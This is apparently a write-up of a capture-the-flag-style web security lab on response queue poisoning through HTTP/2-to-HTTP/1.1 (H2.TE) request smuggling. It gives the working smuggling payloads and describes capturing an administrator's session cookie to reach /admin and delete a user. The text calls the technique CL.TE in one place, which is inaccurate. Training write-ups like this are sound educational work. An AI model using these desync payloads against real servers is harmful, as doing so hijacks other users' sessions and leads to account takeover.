
# Response queue poisoning via H2.TE request smuggling

This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests even if they have an ambiguous length.

To solve the lab, delete the user carlos by using response queue poisoning to break into the admin panel at /admin. An admin user will log in approximately every 15 seconds.

The connection to the back-end is reset every 10 requests, so don't worry if you get it into a bad state - just send a few normal requests to get a fresh connection.

---------------------------------------------

References: 

- https://portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning



![img](images/Response%20queue%20poisoning%20via%20H2.TE%20request%20smuggling/1.png)

---------------------------------------------

There is a search function whose content is reflected inside an h1 element:



![img](images/Response%20queue%20poisoning%20via%20H2.TE%20request%20smuggling/2.png)


Searching generates a POST request:



![img](images/Response%20queue%20poisoning%20via%20H2.TE%20request%20smuggling/3.png)


It looks it is vulnerable to HTTP request smuggling of type CL.TE, and we can read requests with this payload:

```
POST / HTTP/2
...
Content-Type: x-www-form-urlencoded
Content-Length: 156
Transfer-Encoding: chunked

0

POST / HTTP/1.1
Host: 0a32000c046da999825cd4a900ba008a.web-security-academy.net
Content-Type: x-www-form-urlencoded
Content-Length: 100

search=
```




![img](images/Response%20queue%20poisoning%20via%20H2.TE%20request%20smuggling/4.png)


We will smuggle a second whole request, so we will send 2 complete POST requests to /404:

```
POST /404 HTTP/2
...
Content-Type: x-www-form-urlencoded
Content-Length: 149
Transfer-Encoding: chunked

0

POST /404 HTTP/1.1
Host: 0a32000c046da999825cd4a900ba008a.web-security-academy.net
Content-Type: x-www-form-urlencoded
Content-Length: 1

a
```



![img](images/Response%20queue%20poisoning%20via%20H2.TE%20request%20smuggling/5.png)


However, if the next request we send is a POST to “/”, it will return the response to the second POST request to /404, instead of the home page:



![img](images/Response%20queue%20poisoning%20via%20H2.TE%20request%20smuggling/6.png)


And if the third request is to “/404”, it will respond with the response to the last request to “/”, instead of “Not found”:



![img](images/Response%20queue%20poisoning%20via%20H2.TE%20request%20smuggling/7.png)


I sent some more requests and got a redirection code 302 to /my-account setting the cookie value to “XOhkm2PtWb1ciwgfJKMwDHcIGxFjvti1”. It seems this is the administrator cookie and we can delete the user with it:






![img](images/Response%20queue%20poisoning%20via%20H2.TE%20request%20smuggling/8.png)
![img](images/Response%20queue%20poisoning%20via%20H2.TE%20request%20smuggling/9.png)